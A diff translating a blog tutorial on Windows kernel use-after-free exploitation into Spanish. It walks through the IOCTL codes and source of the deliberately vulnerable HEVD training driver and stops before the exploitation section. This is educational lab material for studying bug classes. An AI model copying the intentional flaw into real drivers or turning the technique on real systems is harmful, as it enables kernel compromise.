@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title>0x02 - Introduction to Windows Kernel Use After Frees (UaFs) // </title>
+    <title>0x02 - Introducción a Windows Kernel Use After Frees (UaFs) // </title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.131.0">
@@ -17,18 +17,20 @@
 
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
-  <meta name="twitter:description" content="If you’ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we’ll be returning back to Windows 7 (x86).">
+  <meta name="twitter:title" content="0x02 - Introducción a Windows Kernel Use After Frees (UaFs)">
+  <meta name="twitter:description" content="Si has estado siguiendo la serie de Windows Kernel Exploitation consecutivamente, deberías haber exploited un Stack Overflow básico contra Windows 7 (x86) y Windows 10 (x64). Aunque este es un salto grande, hay muchas más vulnerabilidades que pueden resultar en la ejecución de código. La mejor manera de familiarizarse con ellos es estudiarlos en un sistema con mitigaciones mínimas. Por este motivo volveremos a Windows 7 (x86).
+Además, no utilizaremos Ghidra, esta vez usaremos el código de HEVD.">
 
-    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x02-introduction-to-windows-kernel-uafs/">
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x02-introducci%C3%B3n-a-windows-kernel-uafs/">
   <meta property="og:site_name" content="wetw0rk">
-  <meta property="og:title" content="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
-  <meta property="og:description" content="If you’ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we’ll be returning back to Windows 7 (x86).">
+  <meta property="og:title" content="0x02 - Introducción a Windows Kernel Use After Frees (UaFs)">
+  <meta property="og:description" content="Si has estado siguiendo la serie de Windows Kernel Exploitation consecutivamente, deberías haber exploited un Stack Overflow básico contra Windows 7 (x86) y Windows 10 (x64). Aunque este es un salto grande, hay muchas más vulnerabilidades que pueden resultar en la ejecución de código. La mejor manera de familiarizarse con ellos es estudiarlos en un sistema con mitigaciones mínimas. Por este motivo volveremos a Windows 7 (x86).
+Además, no utilizaremos Ghidra, esta vez usaremos el código de HEVD.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2024-12-14T00:00:00+00:00">
-    <meta property="article:modified_time" content="2024-12-14T00:00:00+00:00">
+    <meta property="article:published_time" content="2024-12-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-15T00:00:00+00:00">
 
 
   </head>
@@ -53,11 +55,11 @@
       
   <article class="post">
     <header class="post-header">
-      <h1 class ="post-title">0x02 - Introduction to Windows Kernel Use After Frees (UaFs)</h1>
+      <h1 class ="post-title">0x02 - Introducción a Windows Kernel Use After Frees (UaFs)</h1>
       <div class="post-meta">
         <div>
           <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
-          Dec 14, 2024
+          Dec 15, 2024
         </div>
         <div>
           <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
@@ -66,42 +68,42 @@
       </div>
     </header>
     <div class="post-content">
-      <p>If you&rsquo;ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we&rsquo;ll be returning back to Windows 7 (x86).</p>
-<p>In addition, we won&rsquo;t be utilizing Ghidra, this time we&rsquo;ll be using the source code. In the next guide we&rsquo;ll re-introduce Ghidra to give you a valuable perspective on how you would identify it using either source or decompiler output.</p>
+      <p>Si has estado siguiendo la serie de Windows Kernel Exploitation consecutivamente, deberías haber exploited un Stack Overflow básico contra Windows 7 (x86) y  Windows 10 (x64). Aunque este es un salto grande, hay muchas más vulnerabilidades que pueden resultar en la ejecución de código. La mejor manera de familiarizarse con ellos es estudiarlos en un sistema con mitigaciones mínimas. Por este motivo volveremos a Windows 7 (x86).</p>
+<p>Además, no utilizaremos Ghidra, esta vez usaremos el código de HEVD. En el próximo artículo volveremos a Ghidra para obtiene una perspectiva sobre cómo lo identificarías utilizando el código o el decompiler.</p>
 <h1 id="table-of-contents">Table of Contents</h1>
 <ul>
-<li><a href="#what-is-a-use-after-free-high-level">What is a Use After Free (High Level)</a></li>
-<li><a href="#using-source---getting-a-lay-of-the-land">Using Source - Getting a Lay of the Land</a>
+<li><a href="#qu%C3%A9-es-un-use-after-free-alto-nivel">Qué es un Use After Free (Alto Nivel)</a></li>
+<li><a href="#usando-el-c%C3%B3digo---ubicarnos-con-el-dise%C3%B1o">Usando el Código - Ubicarnos con el Diseño</a>
 <ul>
-<li><a href="#understanding-allocateuafobjectnonpagedpoolioctlhandler">Understanding AllocateUaFObjectNonPagedPoolIoctlHandler</a></li>
-<li><a href="#understanding-useuafobjectnonpagedpoolioctlhandler">Understanding UseUaFObjectNonPagedPoolIoctlHandler</a></li>
-<li><a href="#understanding-freeuafobjectnonpagedpoolioctlhandler">Understanding FreeUaFObjectNonPagedPoolIoctlHandler</a></li>
-<li><a href="#understanding-allocatefakeobjectnonpagedpoolioctlhandler">Understanding AllocateFakeObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#entender-el-allocateuafobjectnonpagedpoolioctlhandler">Entender el AllocateUaFObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#entender-el-useuafobjectnonpagedpoolioctlhandler">Entender el UseUaFObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#entender-el-freeuafobjectnonpagedpoolioctlhandler">Entender el FreeUaFObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#entender-el-allocatefakeobjectnonpagedpoolioctlhandler">Entender el AllocateFakeObjectNonPagedPoolIoctlHandler</a></li>
 </ul>
 </li>
-<li><a href="#summary-of-functions">Summary of Functions</a></li>
-<li><a href="#exploitation">Exploitation</a></li>
-<li><a href="#sources">Sources</a></li>
+<li><a href="#descripciones-de-funciones">Descripciones de Funciones</a></li>
+<li><a href="#explotaci%C3%B3n">Explotación</a></li>
+<li><a href="#recursos">Recursos</a></li>
 </ul>
-<h1 id="what-is-a-use-after-free-high-level">What is a Use After Free (High Level)</h1>
-<p>Just in case you’re not completely familiar with what a Use-After-Free is, let’s give ourselves a quick high-level overview of this bug class. Basically, a Use After Free (UaF) occurs when we <strong>Use</strong> an object <strong>After</strong> it has been <strong>Free</strong>’d. This “object” can be any structure or class loaded in memory that is later freed.</p>
-<p>To use a non-technical example, let&rsquo;s say you&rsquo;re working under a car and place your tools beside you. You&rsquo;re working upside down so you&rsquo;re not paying attention to your toolbox, you just simply reach into the toolbox and feel around for what you need.</p>
+<h1 id="qué-es-un-use-after-free-alto-nivel">Qué es un Use After Free (Alto Nivel)</h1>
+<p>En caso que no estés familiarizado que es un &ldquo;Use After Free (UaF)&rdquo;, vamos a cubrirlo con una descripción general en que es esta clase de vulnerabilidad. Básicamente, un Use After Free (UaF) ocurre cuando nosotros <strong>usamos</strong> un objeto después de ser libre. Este objeto puede ser cualquier estructura o clase metido en memoria que luego se libera</p>
+<p>Para usar un ejemplo sin ser demasiado técnico, digamos que estás trabajando debajo de un caro y pones tus herramientas a tu lado. Estás trabajando en tu espalda y no estás poniéndo atención a tu caja de herramientas, simplemente metes tu mano en la caja de herramientas y buscas lo que necesitas</p>
 <p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example1.png" alt="alt text"></p>
-<p>In this &ldquo;toolbox&rdquo; you only have a wrench (hard to believe I know), you grab the wrench but instead of putting it back in the toolbox you place it on the floor near your feet. Although at your feet, you believe the wrench has been placed back in its original location.</p>
-<p>Without you noticing some dude throws a can of soda into the toolbox.</p>
+<p>En esta caja de herramientas solo tienes una llave (difícil de creer lo sé), agarras una llave, pero en lugar de volver a guardarla en la caja de herramientas la pones en el suelo cerca de tus pies. Aunque lo pusiste cerca a tus pies, tu crees que la llave la regresaste en su ubicación original.</p>
+<p>Sin que te des cuenta, un hombre tira una lata de soda adentro de la caja de herramientas</p>
 <p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example2.png" alt="alt text"></p>
-<p>When you go and reach for the wrench you don&rsquo;t notice a difference between it and the can (because you have flippers, you’re a penguin). So, you end up dumping cola all over your new tux.</p>
+<p>Cuando vas y alcanzas la llave no notas la diferencia entre ella y la lata (porque tienes aletas eres un pingüino). Entonces, terminas cubierto en soda.</p>
 <p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example3.png" alt="alt text"></p>
-<p>OH NO!! We have fallen victim to a UaF, the dude successfully exploited the UaF.</p>
-<p>How does this relate to computers?</p>
+<p>OH NO!! Hemos caido víctima a un UaF, el hombre logro aprovecha la vulnerabilidad.</p>
+<p>Qué tiene que ver esto con las computadoras?</p>
 <ul>
-<li>The example of blindly reaching into a toolbox mirrors the way programs rely on memory without &ldquo;looking&rdquo; (verifying if it&rsquo;s still valid or changed).</li>
-<li>The unexpected replacement of the wrench with a soda can demonstrates how stale references (pointers) can lead to unintended and harmful outcomes.</li>
-<li>The &ldquo;dude&rdquo; throwing a soda can represents an attacker taking advantage of freed memory (e.g., injecting malicious data/code into reused memory).</li>
+<li>El ejemplo de meter la mano en la caja de herramientas sin mirar, es similar en cómo los programas usan la memoria sin &ldquo;mirar&rdquo; (verificando si es válido o a cambiado)</li>
+<li>El reemplazo de la llave por la soda demuestra como los &ldquo;stale reference (pointers)&rdquo; resultar en operaciones peligrosas</li>
+<li>El hombre tirando la soda representa un atacante aprovechando la memoria liberada (por ejemplo inyectando código malicioso dentro de la memoria reutilizada).</li>
 </ul>
-<p>With that we should be ready to get started.</p>
-<h1 id="using-source---getting-a-lay-of-the-land">Using Source - Getting a Lay of the Land</h1>
-<p>The first thing we want to identify is the location of the I/O Control Codes. From the looks of it, each vulnerability has its own &ldquo;handler&rdquo; function.</p>
+<p>Con esto, estamos listos para comenzar :)</p>
+<h1 id="usando-el-código---ubicarnos-con-el-diseño">Usando el Código - Ubicarnos con el Diseño</h1>
+<p>Lo primero que queremos identificar es la ubicación de los códigos de control I/O. Por lo que se parece, cada vulnerabilidad tiene su propia función de &ldquo;handler&rdquo; (controlador).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>ArbitraryWrite.c:<span style="color:#ae81ff">129</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Arbitrary Write Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>MemoryDisclosureNonPagedPool.c:<span style="color:#ae81ff">178</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Memory Disclosure NonPagedPool Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>DoubleFetch.c:<span style="color:#ae81ff">151</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Double Fetch Ioctl Handler
@@ -130,17 +132,17 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>NullPointerDereference.c:<span style="color:#ae81ff">200</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Null Pointer Dereference Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowStackGS.c:<span style="color:#ae81ff">121</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow Stack GS Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>TypeConfusion.c:<span style="color:#ae81ff">213</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Type Confusion Ioctl Handler
-</span></span></span></code></pre></div><p>We&rsquo;re interested in the <code>UseAfterFreeNonPagedPool I/O Control Codes</code>.</p>
+</span></span></span></code></pre></div><p>Estamos interesados ​​en los códigos de control para el <code>UseAfterFreeNonPagedPool</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">352</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate UaF Object NonPagedPool Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">376</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Use UaF Object NonPagedPool Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">400</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Free UaF Object NonPagedPool Ioctl Handler
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">424</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate Fake Object NonPagedPool Ioctl Handler
-</span></span></span></code></pre></div><p>Based on the naming convention we can identify the following functions:</p>
+</span></span></span></code></pre></div><p>Según la convención de nomenclatura, podemos identificar las siguientes funciones:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">UseUaFObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">FreeUaFObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(
-</span></span></code></pre></div><p>If we trace where these function calls are used, we are led to <code>./HackSysExtremeVulnerableDriver.c</code> which contains a <a href="https://www.w3schools.com/c/c_switch.php">switch statement</a> that would allow us to trigger vulnerable functions.</p>
+</span></span></code></pre></div><p>Si rastreamos desde dónde se llaman estas funciones, llegamos a <code>./HackSysExtremeVulnerableDriver.c</code> que contiene un &ldquo;<a href="https://www.w3schools.com/c/c_switch.php">switch statement</a>&rdquo; que nos permitiría activar estas funciones vulnerables.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">294</span>         <span style="color:#66d9ef">case</span> HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">295</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">296</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
@@ -161,8 +163,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">312</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">313</span>             <span style="color:#66d9ef">break</span>;
-</span></span></code></pre></div><p>This however still did not give us the <code>I/O Control Codes</code> so before trying to search within each file using some grep-fu, let&rsquo;s check the header file <code>HackSysExtremeVulnerableDriver.h</code>.</p>
-<p>Within it we are given a list of IOCTL Codes :)</p>
+</span></span></code></pre></div><p>Sin embargo, esto todavía no nos dio los códigos de <code>I/O</code>, así que antes de intentar buscar dentro de cada página usando grep-fu, revisemos el &ldquo;header file&rdquo; <code>HackSysExtremeVulnerableDriver.h</code>.</p>
+<p>Dentro de ella se nos da una lista de códigos IOCTL :)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">81</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x800</span>)
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">82</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x801</span>)
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">83</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ARBITRARY_WRITE                               <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x802</span>)
@@ -191,13 +193,13 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">106</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x819</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">107</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x81A</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">108</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x81B</span>)
-</span></span></code></pre></div><p>However, for this tutorial we&rsquo;d only be focusing on the following:</p>
+</span></span></code></pre></div><p>Sin embargo, para este tutorial solo nos centraremos en lo siguiente:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">85</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>)
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x805</span>)
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>)
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x807</span>)
-</span></span></code></pre></div><h2 id="understanding-allocateuafobjectnonpagedpoolioctlhandler">Understanding AllocateUaFObjectNonPagedPoolIoctlHandler</h2>
-<p>We can find this function within <code>UseAfterFreeNonPagedPool.c</code> on line 357.</p>
+</span></span></code></pre></div><h2 id="entender-el-allocateuafobjectnonpagedpoolioctlhandler">Entender el AllocateUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>Podemos encontrar esta función dentro de <code>UseAfterFreeNonPagedPool.c</code> en línea 357.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">357</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">358</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">359</span>     _In_ PIRP Irp,
@@ -214,7 +216,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">370</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">371</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">372</span> }
-</span></span></code></pre></div><p>This function ultimately calls <code>AllocateUaFObjectNonPagedPool</code>, which starts on line 86.</p>
+</span></span></code></pre></div><p>Esta función llamará <code>AllocateUaFObjectNonPagedPool</code>, que comienza en línea 86.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">86</span> NTSTATUS
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPool</span>(
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>     VOID
@@ -294,31 +296,31 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">162</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">163</span>     <span style="color:#66d9ef">return</span> Status;
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">164</span> }
-</span></span></code></pre></div><p>Let&rsquo;s break down what this function is doing at a high-level.</p>
+</span></span></code></pre></div><p>Analicemos esta función en un nivel alto.</p>
 <ul>
-<li>Lines <strong>91-92</strong> we see variables being declared, one of them being a custom structure containing two members: a <code>function pointer</code>, and a <code>char buffer[0x54]</code>.</li>
-<li>On line <strong>94</strong> we see the PAGED_CODE macro defined. This macro marks this function as pageable. What this means is, if the function is not present in memory it may be moved to disk. The OS will do this if it needs physical memory for other tasks.</li>
-<li>Lines <strong>104-108</strong> we see a call to ExAllocatePoolWithTag() this is a Windows API call. Basically, what this does is allocate &ldquo;pool memory&rdquo; of a specified type and will return a pointer to the allocated block, which as we can see is then casted.
+<li>Líneas <strong>91-92</strong> vemos que se declaran variables, una de ellas es una estructura personalizada que contiene dos miembros: un <code>puntero a una función</code> y un <code>char buffer[0x54]</code>.</li>
+<li>En línea <strong>94</strong> vemos el PAGED_CODE macro definido. Este macro marca esta función &ldquo;pageable&rdquo;. Lo que esto significa es que, si la función no está presente en la memoria, se puede mover al disco. El OS ará esto si necesita memoria física para otras cosas.</li>
+<li>Líneas <strong>104-108</strong> vemos una llamada a ExAllocatePoolWithTag() esto es una llamada del Windows API. Básicamente, lo que esto hace es crear &ldquo;memoria de piscina&rdquo; o &ldquo;pool memory&rdquo; de un tipo específico y devolverá un puntero a la sección de memoria creada, que como podemos ver luego se &ldquo;cast&rdquo;.
 <ul>
-<li><strong>Argument 1</strong>: Here we use a Nonpaged pool, which can be accessed from any IRQL, notably memory allocated with this type is <code>EXECUTABLE</code>.</li>
-<li><strong>Argument 2</strong>: Size of the chunk.</li>
-<li><strong>Argument 3</strong>: A pool tag, which from my understanding is for debugging purposes. We can find this in common.h as Hack or &ldquo;kcaH&rdquo; since it must be specified in reverse order.</li>
+<li><strong>Argumento 1</strong>: Aquí usamos una piscina &ldquo;Nonpaged&rdquo;, al que puede acceder cualquier IRQL, notablemente la memoria asignada con este tipo es ejecutable o <code>EXECUTABLE</code>.</li>
+<li><strong>Argumento 2</strong>: Tamaño</li>
+<li><strong>Argumento 3</strong>: Una marca de la piscina, que a mi entender es para debug. Lo podemos encontrar en &ldquo;common.h&rdquo; como Hack o &ldquo;kcaH&rdquo; como tiene que estar en orden inverso.</li>
 </ul>
 </li>
-<li>Lines <strong>110-127</strong> we can ignore as it&rsquo;s just error/success checking the last call</li>
-<li>On line <strong>133</strong> we basically see a call to <code>RtlFillMemory()</code> another Windows API (memset in nix).</li>
-<li>On line <strong>139</strong> we NULL terminate the buffer we filled with A&rsquo;s.</li>
-<li>On line <strong>145</strong> we set the function pointer to the <code>UaFObjectCallbackNonPagedPool</code> function.</li>
-<li>On line <strong>151</strong> we assign the address of the allocated object to a global variable.</li>
+<li>Líneas <strong>110-127</strong> nosotros podemos ignorar ya que es solo comprobando la última llamada si fue malo / bueno</li>
+<li>En línea <strong>133</strong> básicamente vemos una llamada a <code>RtlFillMemory()</code> otro Windows API (memset en nix).</li>
+<li>En línea <strong>139</strong> terminamos el buffer que llenamos con A&rsquo;s con un NULL</li>
+<li>En línea <strong>145</strong> establecemos el puntero a la función para apuntar a la función <code>UaFObjectCallbackNonPagedPool</code>.</li>
+<li>En línea <strong>151</strong> asignamos la dirección del objeto creado a la variable global.</li>
 </ul>
-<p>Pretty straight forward! We&rsquo;re just allocating some memory (marked executable) to hold the <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code> structure, fill the <code>Buffer</code> member (char array), and set the Callback member (function pointer). The structure definition can be seen below:</p>
+<p>No está tan mal! Solo estamos creando una región de memoria (marcado ejecutable) para sostener la estructura <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code>, llenar el <code>Buffer</code> miembro (char array), y establece el miembro de Callback (puntero a una función). La definición de la estructura se puede ver a aquí:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USE_AFTER_FREE_NON_PAGED_POOL
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {   
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     FunctionPointer Callback;
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     CHAR Buffer[<span style="color:#ae81ff">0x54</span>];
 </span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } USE_AFTER_FREE_NON_PAGED_POOL, <span style="color:#f92672">*</span>PUSE_AFTER_FREE_NON_PAGED_POOL;
-</span></span></code></pre></div><h2 id="understanding-useuafobjectnonpagedpoolioctlhandler">Understanding UseUaFObjectNonPagedPoolIoctlHandler</h2>
-<p>Once again, this as a &ldquo;wrapper&rdquo; to call another function:</p>
+</span></span></code></pre></div><h2 id="entender-el-useuafobjectnonpagedpoolioctlhandler">Entender el UseUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>Una vez más, este es un &ldquo;wrapper&rdquo; para llamar a otra función:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">375</span> <span style="color:#75715e">/// &lt;summary&gt;                                                             
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">376</span> <span style="color:#75715e">/// Use UaF Object NonPagedPool Ioctl Handler                             
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">377</span> <span style="color:#75715e">/// &lt;/summary&gt;                                                            
@@ -341,7 +343,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">394</span>                                                                           
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">395</span>     <span style="color:#66d9ef">return</span> Status;                                                        
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">396</span> } 
-</span></span></code></pre></div><p>Let&rsquo;s look at <code>UseUaFObjectNonPagedPool()</code>.</p>
+</span></span></code></pre></div><p>Miremos <code>UseUaFObjectNonPagedPool()</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">171</span> NTSTATUS
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">172</span> <span style="color:#a6e22e">UseUaFObjectNonPagedPool</span>(
